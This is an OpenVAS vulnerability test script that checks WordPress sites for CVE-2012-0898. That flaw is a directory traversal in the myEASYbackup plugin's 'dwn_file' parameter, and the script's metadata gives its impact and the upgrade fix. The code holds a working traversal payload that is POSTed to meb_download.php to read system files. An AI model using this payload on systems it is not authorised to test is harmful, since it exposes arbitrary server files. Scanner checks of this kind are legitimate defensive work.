###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_myeasybackup_plugin_dir_trav_vuln.nasl 13962 2019-03-01 14:14:42Z cfischer $
#
# WordPress myEASYbackup Plugin 'dwn_file' Parameter Directory Traversal Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802380");
  script_version("$Revision: 13962 $");
  script_cve_id("CVE-2012-0898");
  script_bugtraq_id(51433);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Do, 26 Okt 2017)$");
  script_tag(name:"creation_date", value:"2012-01-17 12:16:44 +0530 (Tue, 17 Jan 2012)");
  script_name("WordPress myEASYbackup Plugin 'dwn_file' Parameter Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47594");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/47594");
  script_xref(name:"URL", value:"http://forums.cnet.com/7726-6132_102-5261356.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108711/wpmyeasybackup-traversal.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to read arbitrary
  files via directory traversal attacks and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress myEASYbackup Plugin version 1.0.8.1");

  script_tag(name:"insight", value:"The flaw is due to an input validation error in 'dwn_file'
  parameter to 'wp-content/plugins/myeasybackup/meb_download.php', which allows
  attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"Upgrade to WordPress myEASYbackup Plugin version 1.0.9 or
  later.");

  script_tag(name:"summary", value:"This host is running with WordPress myEASYbackup Plugin and is
  prone to directory traversal vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/myeasybackup/");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

host = http_host_name(port:port);

foreach file (keys(files)){

  postData = "dwn_file=..%2F..%2F..%2F..%2F"+ files[file] + "&submit=submit";
  path = dir + "/wp-content/plugins/myeasybackup/meb_download.php";

  req = string("POST ", path, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData),
               "\r\n\r\n", postData);
  res = http_send_recv(port:port, data:req);

  if(egrep(pattern:file, string:res)){
    report = report_vuln_url(port:port, url:path);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);